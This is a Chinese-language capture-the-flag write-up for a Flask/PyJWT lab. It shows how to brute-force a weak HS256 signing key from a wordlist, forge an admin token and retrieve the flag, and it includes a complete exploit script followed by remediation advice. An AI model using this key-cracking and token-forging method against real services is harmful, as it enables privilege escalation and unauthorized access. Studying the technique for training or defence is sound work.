# A07 Authentication Failures - Medium WriteUP

## 认证机制分析

本题目是一个基于 Flask + JWT (PyJWT) 的身份认证系统：
- 用户注册/登录后，服务器签发 JWT Token
- JWT 使用 **HS256** 对称签名算法
- Token payload 中包含 `username` 和 `role` 字段
- 访问 `/admin/flag` 需要 `role=admin`
- **密钥是一个常见英文单词**，容易被字典爆破

## 攻击原理

JWT HS256 使用对称密钥进行签名和验证。如果密钥强度不足（常见单词、短密码），攻击者可以通过字典爆破找到正确密钥，然后使用同一密钥伪造任意 payload 的 Token。

攻击流程：
1. 获取一个合法的 JWT Token
2. 使用字典中的每个单词尝试验证 Token 签名
3. 找到正确密钥后，修改 payload 中的 `role` 为 `admin`
4. 使用密钥重新签名，发送伪造的 Token 获取 Flag

## 攻击步骤

### 步骤1：注册并获取 JWT Token

```bash
curl -X POST http://target/register -d "username=hacker" -d "password=hacker123"
curl -X POST http://target/login -d "username=hacker" -d "password=hacker123"
```

得到类似：
```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJ1c2VyIn0.xxx"}
```

### 步骤2：分析 JWT 结构

将 Token 在 [jwt.io](https://jwt.io) 上解码，或使用 Python：

```python
import jwt
import base64

token = "eyJ..."
# 查看 header（不验证签名）
header = jwt.get_unverified_header(token)
print(header)  # {'alg': 'HS256', 'typ': 'JWT'}

# 查看 payload
payload = jwt.decode(token, options={"verify_signature": False})
print(payload)  # {'username': 'hacker', 'role': 'user'}
```

### 步骤3：爆破密钥

```python
import jwt

token = "your_jwt_token_here"
words = open('english_words.txt').read().splitlines()

for word in words:
    try:
        jwt.decode(token, word, algorithms=['HS256'])
        print(f"[+] Key found: {word}")
        break
    except jwt.InvalidSignatureError:
        pass
    except Exception as e:
        pass
```

### 步骤4：伪造 admin Token

```python
import jwt

key = "secret"  # 爆破得到的密钥
forged = jwt.encode(
    {"username": "hacker", "role": "admin"},
    key,
    algorithm="HS256"
)
print(forged)
```

### 步骤5：获取 Flag

```bash
curl -H "Authorization: Bearer <forged_token>" http://target/admin/flag
```

## Python 完整利用脚本

```python
import requests
import jwt

TARGET = "http://localhost:8088"
USERNAME = "hacker"
PASSWORD = "hacker123"
WORDLIST = "english_words.txt"

# 1. Register
resp = requests.post(f"{TARGET}/register", data={"username": USERNAME, "password": PASSWORD})
print("Register:", resp.status_code, resp.text)

# 2. Login
resp = requests.post(f"{TARGET}/login", data={"username": USERNAME, "password": PASSWORD})
token = resp.json().get("token")
print("Token:", token)

# 3. Crack key
words = open(WORDLIST).read().splitlines()
found_key = None
for word in words:
    try:
        jwt.decode(token, word, algorithms=['HS256'])
        found_key = word
        print(f"[+] Key found: {word}")
        break
    except jwt.InvalidSignatureError:
        pass

if not found_key:
    print("[-] Key not found")
    exit(1)

# 4. Forge admin token
forged_token = jwt.encode(
    {"username": USERNAME, "role": "admin"},
    found_key,
    algorithm="HS256"
)
print("Forged token:", forged_token)

# 5. Get flag
resp = requests.get(f"{TARGET}/admin/flag", headers={"Authorization": f"Bearer {forged_token}"})
print("Flag response:", resp.json())
```

## 修复建议

1. **使用强密钥**：JWT 密钥应为随机生成的长字符串（至少256位），而非字典单词
2. **使用非对称算法**：将 HS256 改为 RS256/ES256，使用公钥/私钥对，私钥仅在服务端保存
3. **密钥轮换**：定期更换 JWT 签名密钥
4. **Payload 完整性校验**：在 payload 中加入用户不可控的字段（如用户ID哈希），服务端额外校验
5. **最小权限原则**：即使是普通用户 Token，也不应能通过简单修改字段提升权限
6. **使用成熟的 JWT 库**：确保库版本最新，避免已知漏洞
